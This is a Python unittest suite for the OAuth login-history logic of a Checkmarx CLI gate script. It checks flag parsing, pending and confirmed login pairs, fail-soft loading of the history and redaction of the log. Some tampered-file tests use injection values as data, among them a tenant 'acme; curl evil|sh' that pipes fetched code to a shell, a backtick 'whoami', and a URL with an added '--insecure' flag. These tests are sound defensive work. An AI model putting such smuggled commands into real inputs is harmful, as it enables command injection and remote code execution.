"""Tests for the OAuth login history in cx_check.py (remembered base-URL/tenant pairs).

Dependency-free (stdlib unittest) so it runs on every OS with `python -m unittest`.
Run from the repo root:  python -m unittest discover -s tests -v
"""

import json
import os
import tempfile
import time
import unittest

from _gatelib import (_URL_ANZ, _URL_EU, _URL_IND, _URL_US, _bash, _HistoryFileMixin,
                      cx_check, cx_log)


class ParseLoginFlags(unittest.TestCase):
    def test_space_form(self):
        self.assertEqual(
            cx_check._parse_login_flags(
                "cx auth login --base-auth-uri %s --tenant acme-corp" % _URL_EU),
            (_URL_EU, "acme-corp"))

    def test_equals_form(self):
        self.assertEqual(
            cx_check._parse_login_flags(
                "cx auth login --base-auth-uri=%s --tenant=acme" % _URL_EU),
            (_URL_EU, "acme"))

    def test_double_quoted_values(self):
        self.assertEqual(
            cx_check._parse_login_flags(
                'cx auth login --base-auth-uri "%s" --tenant "acme"' % _URL_EU),
            (_URL_EU, "acme"))

    def test_single_quoted_values(self):
        self.assertEqual(
            cx_check._parse_login_flags(
                "cx auth login --base-auth-uri '%s' --tenant 'acme'" % _URL_EU),
            (_URL_EU, "acme"))

    def test_absolute_path_cx_form(self):
        # The resolved-path shape the deny message emits on a first-install session.
        self.assertEqual(
            cx_check._parse_login_flags(
                '"C:/Users/x/AppData/Local/Checkmarx/cx/cx.exe" auth login '
                "--base-auth-uri %s --tenant acme" % _URL_EU),
            (_URL_EU, "acme"))

    def test_null_redirect_tail_not_captured(self):
        self.assertEqual(
            cx_check._parse_login_flags(
                "cx auth login --base-auth-uri %s --tenant acme 1>/dev/null" % _URL_EU),
            (_URL_EU, "acme"))

    def test_extra_flags_ignored(self):
        self.assertEqual(
            cx_check._parse_login_flags(
                "cx auth login --no-browser --base-auth-uri %s --tenant acme" % _URL_EU),
            (_URL_EU, "acme"))

    def test_missing_tenant_returns_none(self):
        self.assertIsNone(
            cx_check._parse_login_flags("cx auth login --base-auth-uri %s" % _URL_EU))

    def test_missing_url_returns_none(self):
        self.assertIsNone(cx_check._parse_login_flags("cx auth login --tenant acme"))

    def test_configure_set_never_parsed(self):
        self.assertIsNone(cx_check._parse_login_flags(
            "cx configure set --prop-name cx_apikey --prop-value SECRET"))

    def test_auth_validate_never_parsed(self):
        self.assertIsNone(cx_check._parse_login_flags("cx auth validate --retry 0"))

    def test_http_scheme_rejected(self):
        self.assertIsNone(cx_check._parse_login_flags(
            "cx auth login --base-auth-uri http://eu.ast.checkmarx.net --tenant acme"))

    def test_url_with_path_rejected(self):
        self.assertIsNone(cx_check._parse_login_flags(
            "cx auth login --base-auth-uri %s/auth/realms/x --tenant acme" % _URL_EU))

    def test_flag_valued_tenant_rejected(self):
        # `--tenant --no-browser` must not record a flag as the tenant (leading dash banned).
        self.assertIsNone(cx_check._parse_login_flags(
            "cx auth login --base-auth-uri %s --tenant --no-browser" % _URL_EU))

    def test_overlong_tenant_rejected(self):
        self.assertIsNone(cx_check._parse_login_flags(
            "cx auth login --base-auth-uri %s --tenant %s" % (_URL_EU, "a" * 65)))

    def test_empty_command_returns_none(self):
        self.assertIsNone(cx_check._parse_login_flags(""))

    def test_repeated_flag_takes_last_occurrence(self):
        # cobra-style CLIs honor the LAST occurrence — recording the first would remember a pair
        # the login never used.
        self.assertEqual(
            cx_check._parse_login_flags(
                "cx auth login --base-auth-uri %s --base-auth-uri %s "
                "--tenant alpha --tenant beta" % (_URL_EU, _URL_US)),
            (_URL_US, "beta"))


class RecordLoginAttempt(_HistoryFileMixin):
    def test_record_creates_pending(self):
        cx_check._record_login_attempt(
            "cx auth login --base-auth-uri %s --tenant acme" % _URL_EU, self.path)
        entries = cx_check._load_login_history(self.path)
        self.assertEqual(len(entries), 1)
        self.assertEqual(entries[0]["base_auth_uri"], _URL_EU)
        self.assertEqual(entries[0]["tenant"], "acme")
        self.assertEqual(entries[0]["status"], "pending")

    def test_non_login_command_records_nothing(self):
        cx_check._record_login_attempt(
            "cx configure set --prop-name cx_apikey --prop-value SECRET", self.path)
        self.assertFalse(os.path.exists(self.path))

    def test_configure_set_drops_pendings_but_keeps_confirmed(self):
        # The developer switched to the API-key path — an in-flight OAuth pending must not survive
        # to be promoted off the credential write the configure is about to make.
        self._entries((_URL_EU, "inflight", "pending", 100, 50.0),
                      (_URL_US, "good", "confirmed", 90))
        cx_check._record_login_attempt(
            "cx configure set --prop-name cx_apikey --prop-value SECRET", self.path)
        entries = cx_check._load_login_history(self.path)
        self.assertEqual([e["tenant"] for e in entries], ["good"])

    def test_cred_before_snapshot_roundtrips(self):
        self._set_cred_mtime(123.5)
        cx_check._record_login_attempt(
            "cx auth login --base-auth-uri %s --tenant acme" % _URL_EU, self.path)
        entries = cx_check._load_login_history(self.path)
        self.assertEqual(entries[0]["cred_before"], 123.5)

    def test_dedupe_case_insensitive_and_bumps_timestamp(self):
        self._entries((_URL_EU, "acme", "confirmed", 100))
        cx_check._record_login_attempt(
            "cx auth login --base-auth-uri %s --tenant ACME" % _URL_EU.upper().replace(
                "HTTPS", "https"), self.path)
        entries = cx_check._load_login_history(self.path)
        self.assertEqual(len(entries), 1)
        self.assertGreater(entries[0]["last_used"], 100)

    def test_rerecord_of_confirmed_pair_stays_confirmed(self):
        # A re-login with a known-good pair (e.g. token expiry) must not demote it to pending —
        # a network-failed re-login would otherwise lose a previously working pair.
        self._entries((_URL_EU, "acme", "confirmed", 100))
        cx_check._record_login_attempt(
            "cx auth login --base-auth-uri %s --tenant acme" % _URL_EU, self.path)
        entries = cx_check._load_login_history(self.path)
        self.assertEqual(entries[0]["status"], "confirmed")

    def test_new_pair_is_pending_and_first(self):
        self._entries((_URL_EU, "acme", "confirmed", 100))
        cx_check._record_login_attempt(
            "cx auth login --base-auth-uri %s --tenant beta" % _URL_US, self.path)
        entries = cx_check._load_login_history(self.path)
        self.assertEqual(entries[0]["tenant"], "beta")
        self.assertEqual(entries[0]["status"], "pending")
        self.assertEqual(entries[1]["tenant"], "acme")

    def test_cap_evicts_oldest(self):
        now = time.time()
        self._entries(*[(u, "t%d" % i, "confirmed", now - 100 + i) for i, u in enumerate(
            [_URL_EU, _URL_US, _URL_ANZ, _URL_IND, "https://us.ast.checkmarx.net"])])
        cx_check._record_login_attempt(
            "cx auth login --base-auth-uri https://eu-2.ast.checkmarx.net --tenant newest",
            self.path)
        entries = cx_check._load_login_history(self.path)
        self.assertEqual(len(entries), cx_check._LOGIN_HISTORY_MAX)
        self.assertEqual(entries[0]["tenant"], "newest")
        # the oldest (t0) fell off
        self.assertNotIn("t0", [e["tenant"] for e in entries])


class PromotePendingLogin(_HistoryFileMixin):
    def test_promotes_newest_pending_when_credential_changed(self):
        self._entries((_URL_EU, "old-fail", "pending", 100, 50),
                      (_URL_US, "worked", "pending", 200, 50),
                      (_URL_ANZ, "keep", "confirmed", 50))
        self._set_cred_mtime(250)  # credential CHANGED since both attempts → newest promoted
        cx_check._promote_pending_login(self.path)
        entries = cx_check._load_login_history(self.path)
        by_tenant = {e["tenant"]: e["status"] for e in entries}
        self.assertEqual(by_tenant.get("worked"), "confirmed")
        self.assertEqual(by_tenant.get("keep"), "confirmed")
        self.assertNotIn("old-fail", by_tenant)  # superseded failed attempt dropped

    def test_inflight_pending_not_promoted(self):
        # Credential UNCHANGED since the attempt was recorded (login not finished yet).
        now = time.time()
        self._entries((_URL_EU, "inflight", "pending", now, 500.0))
        self._set_cred_mtime(500.0)
        cx_check._promote_pending_login(self.path)
        entries = cx_check._load_login_history(self.path)
        self.assertEqual(entries[0]["status"], "pending")

    def test_promotion_long_after_login(self):
        # Regression (review finding): the first gated call after a successful login may come many
        # hours later — promotion must still happen, even for a pending older than the prune TTL.
        now = time.time()
        self._entries((_URL_EU, "overnight", "pending", now - 90000, 100.0))
        self._set_cred_mtime(200.0)  # credential changed since the attempt
        cx_check._promote_pending_login(self.path)
        self.assertEqual(cx_check._load_login_history(self.path)[0]["status"], "confirmed")

    def test_credential_appearing_counts_as_change(self):
        # No credential existed when the attempt was recorded (cred_before None) — one existing
        # now IS the change that proves the login wrote it.
        now = time.time()
        self._entries((_URL_EU, "first-login", "pending", now, None))
        self._set_cred_mtime(300.0)
        cx_check._promote_pending_login(self.path)
        self.assertEqual(cx_check._load_login_history(self.path)[0]["status"], "confirmed")

    def test_stale_pending_pruned(self):
        now = time.time()
        self._entries((_URL_EU, "abandoned", "pending", now - 7200, 500.0))
        self._set_cred_mtime(500.0)  # credential never changed — the attempt failed/was abandoned
        cx_check._promote_pending_login(self.path)
        self.assertEqual(cx_check._load_login_history(self.path), [])

    def test_no_pending_is_a_noop(self):
        self._entries((_URL_EU, "acme", "confirmed", 100))
        with open(self.path, encoding="utf-8") as f:
            before = f.read()
        self._set_cred_mtime(time.time())
        cx_check._promote_pending_login(self.path)
        with open(self.path, encoding="utf-8") as f:
            self.assertEqual(f.read(), before)

    def test_missing_credential_keeps_recent_pending(self):
        now = time.time()
        self._entries((_URL_EU, "acme", "pending", now))
        self._set_cred_mtime(None)
        cx_check._promote_pending_login(self.path)
        self.assertEqual(cx_check._load_login_history(self.path)[0]["status"], "pending")


class ConfirmedLoginPairs(_HistoryFileMixin):
    def test_most_recent_first_and_pending_excluded(self):
        self._entries((_URL_EU, "older", "confirmed", 100),
                      (_URL_US, "newest", "confirmed", 300),
                      (_URL_ANZ, "pend", "pending", 400))
        self.assertEqual(cx_check._confirmed_login_pairs(self.path),
                         [(_URL_US, "newest"), (_URL_EU, "older")])

    def test_offer_capped(self):
        self._entries(*[(u, "t%d" % i, "confirmed", i) for i, u in enumerate(
            [_URL_EU, _URL_US, _URL_ANZ, _URL_IND])])
        self.assertEqual(len(cx_check._confirmed_login_pairs(self.path)),
                         cx_check._LOGIN_HISTORY_OFFER_MAX)

    def test_missing_file_is_empty(self):
        self.assertEqual(cx_check._confirmed_login_pairs(self.path), [])


class LoadLoginHistoryFailSoft(_HistoryFileMixin):
    def test_corrupt_json_is_empty(self):
        self._write_raw("{not json")
        self.assertEqual(cx_check._load_login_history(self.path), [])

    def test_wrong_version_is_empty(self):
        self._write_raw({"version": 2, "entries": []})
        self.assertEqual(cx_check._load_login_history(self.path), [])

    def test_boolean_version_is_empty(self):
        # True == 1 in Python; a boolean version marker must not pass the version gate.
        self._write_raw({"version": True, "entries": [
            {"base_auth_uri": _URL_EU, "tenant": "acme", "status": "confirmed", "last_used": 1}]})
        self.assertEqual(cx_check._load_login_history(self.path), [])

    def test_invalid_entry_logging_capped_to_one_event_per_load(self):
        self._entries((_URL_EU, "`whoami`", "confirmed", 100),
                      ("http://evil", "x", "confirmed", 100),
                      (_URL_US, "-bad", "pending", 100),
                      (_URL_ANZ, "good", "confirmed", 200))
        calls = []
        orig_log = cx_check._log
        cx_check._log = lambda event, **fields: calls.append((event, fields))
        try:
            entries = cx_check._load_login_history(self.path)
        finally:
            cx_check._log = orig_log
        self.assertEqual([e["tenant"] for e in entries], ["good"])
        invalid_calls = [c for c in calls if c[1].get("action") == "invalid"]
        self.assertEqual(len(invalid_calls), 1)
        self.assertEqual(invalid_calls[0][1].get("count"), 3)

    def test_non_dict_payload_is_empty(self):
        self._write_raw([1, 2, 3])
        self.assertEqual(cx_check._load_login_history(self.path), [])

    def test_oversized_refused(self):
        self._write_raw(json.dumps({"version": 1, "entries": []}) + " " * 20000)
        self.assertEqual(cx_check._load_login_history(self.path), [])

    # --- injection vectors via a tampered file: entries must be dropped, never rendered ---
    def test_tampered_url_entry_dropped(self):
        self._entries(("https://evil.example/x --insecure", "acme", "confirmed", 100))
        self.assertEqual(cx_check._load_login_history(self.path), [])

    def test_http_scheme_entry_dropped(self):
        self._entries(("http://eu.ast.checkmarx.net", "acme", "confirmed", 100))
        self.assertEqual(cx_check._load_login_history(self.path), [])

    def test_tampered_tenant_entry_dropped(self):
        self._entries((_URL_EU, "acme; curl evil|sh", "confirmed", 100))
        self.assertEqual(cx_check._load_login_history(self.path), [])

    def test_leading_dash_tenant_entry_dropped(self):
        self._entries((_URL_EU, "-leadingdash", "confirmed", 100))
        self.assertEqual(cx_check._load_login_history(self.path), [])

    def test_unknown_status_dropped(self):
        self._entries((_URL_EU, "acme", "root", 100))
        self.assertEqual(cx_check._load_login_history(self.path), [])

    def test_bool_timestamp_dropped(self):
        self._entries((_URL_EU, "acme", "confirmed", True))
        self.assertEqual(cx_check._load_login_history(self.path), [])

    def test_valid_entry_survives_next_to_tampered_one(self):
        self._entries((_URL_EU, "`whoami`", "confirmed", 100),
                      (_URL_US, "good", "confirmed", 200))
        entries = cx_check._load_login_history(self.path)
        self.assertEqual([e["tenant"] for e in entries], ["good"])

    def test_none_history_file_noops(self):
        orig = cx_check._LOGIN_HISTORY_FILE
        cx_check._LOGIN_HISTORY_FILE = None
        try:
            self.assertEqual(cx_check._load_login_history(), [])
            cx_check._record_login_attempt(
                "cx auth login --base-auth-uri %s --tenant acme" % _URL_EU)
            cx_check._promote_pending_login()
            self.assertEqual(cx_check._confirmed_login_pairs(), [])
        finally:
            cx_check._LOGIN_HISTORY_FILE = orig


class OAuthRecoveryBulletHistory(unittest.TestCase):
    _HISTORY = [(_URL_EU, "acme-corp"), (_URL_US, "beta-inc")]

    def test_admin_precedence_over_history(self):
        b = cx_check._oauth_recovery_bullet(
            {"cx_base_auth_uri": _URL_EU, "cx_tenant": "admin-t"}, self._HISTORY)
        self.assertIn("PRECONFIGURED", b)
        self.assertNotIn("PREVIOUSLY LOGGED IN", b)

    def test_partial_admin_with_history_uses_history(self):
        b = cx_check._oauth_recovery_bullet({"cx_tenant": "admin-t"}, self._HISTORY)
        self.assertIn("PREVIOUSLY LOGGED IN", b)
        self.assertNotIn("<url>", b)

    def test_history_branch_lists_pairs_most_recent_first(self):
        b = cx_check._oauth_recovery_bullet({}, self._HISTORY)
        self.assertLess(b.index("acme-corp"), b.index("beta-inc"))
        self.assertIn("--base-auth-uri %s --tenant acme-corp" % _URL_EU, b)
        self.assertIn("--base-auth-uri %s --tenant beta-inc" % _URL_US, b)

    def test_history_branch_instructs_askuserquestion_and_no_autopick(self):
        b = cx_check._oauth_recovery_bullet({}, self._HISTORY)
        self.assertIn("AskUserQuestion", b)
        self.assertIn("do NOT run any login until the developer explicitly picks", b)
        self.assertIn("Other", b)

    def test_no_history_placeholder_branch_unchanged(self):
        # NB: history=None means "load lazily from the real state file" — hermetic tests must pass
        # an explicit empty history instead.
        for empty in ({}, []):
            b = cx_check._oauth_recovery_bullet({}, empty)
            self.assertIn("<url>", b)
            self.assertIn("<tenant>", b)
            self.assertNotIn("PREVIOUSLY LOGGED IN", b)


class CarveOutRoundTrip(_HistoryFileMixin):
    """Every ready-to-run command the history bullet emits must still pass the auth-recovery
    carve-out, otherwise the gate would block the very command it just handed out."""

    def test_history_composed_commands_pass_carveout(self):
        b = cx_check._oauth_recovery_bullet({}, [(_URL_EU, "acme-corp"), (_URL_US, "beta")])
        commands = [line.strip() for line in b.splitlines()
                    if "auth login --base-auth-uri https" in line]
        self.assertEqual(len(commands), 2)
        for command in commands:
            self.assertTrue(cx_check._is_auth_recovery_command(_bash(command)),
                            "composed recovery command rejected by carve-out: %r" % command)

    def test_recorded_pair_roundtrips_to_bullet(self):
        cx_check._record_login_attempt(
            "cx auth login --base-auth-uri %s --tenant acme 1>/dev/null" % _URL_EU, self.path)
        self._set_cred_mtime(2000.0)  # credential changed after the attempt (recorded at 1000.0)
        cx_check._promote_pending_login(self.path)
        pairs = cx_check._confirmed_login_pairs(self.path)
        self.assertEqual(pairs, [(_URL_EU, "acme")])
        b = cx_check._oauth_recovery_bullet({}, pairs)
        self.assertIn("--base-auth-uri %s --tenant acme" % _URL_EU, b)


class LoginHistoryLogging(unittest.TestCase):
    """The cx_log allowlist must accept the login_history event but NEVER a URL/tenant value."""

    def test_event_allowlisted_with_safe_fields_only(self):
        schema = cx_log._EVENTS.get("login_history")
        self.assertIsNotNone(schema, "login_history event missing from cx_log allowlist")
        self.assertEqual(schema["action"]("recorded"), "recorded")
        self.assertEqual(schema["action"]("evil-value"), "other")
        self.assertEqual(schema["count"](2), 2)
        self.assertNotIn("base_auth_uri", schema)
        self.assertNotIn("tenant", schema)

    def test_values_never_reach_the_log(self):
        tmp = tempfile.mkdtemp(prefix="cx-log-test-")
        orig = os.environ.get("CX_LOG_DIR")
        orig_disable = os.environ.pop("CX_LOG_DISABLE", None)
        os.environ["CX_LOG_DIR"] = tmp
        try:
            cx_log.log_event("login_history", action="offered", count=2,
                             base_auth_uri=_URL_EU, tenant="secret-tenant")
            log_path = os.path.join(tmp, "cx-devassist.jsonl")
            with open(log_path, encoding="utf-8") as f:
                content = f.read()
            self.assertIn('"action":"offered"', content)
            self.assertNotIn("secret-tenant", content)
            self.assertNotIn(_URL_EU, content)
        finally:
            if orig is None:
                os.environ.pop("CX_LOG_DIR", None)
            else:
                os.environ["CX_LOG_DIR"] = orig
            if orig_disable is not None:
                os.environ["CX_LOG_DISABLE"] = orig_disable


if __name__ == "__main__":
    unittest.main()
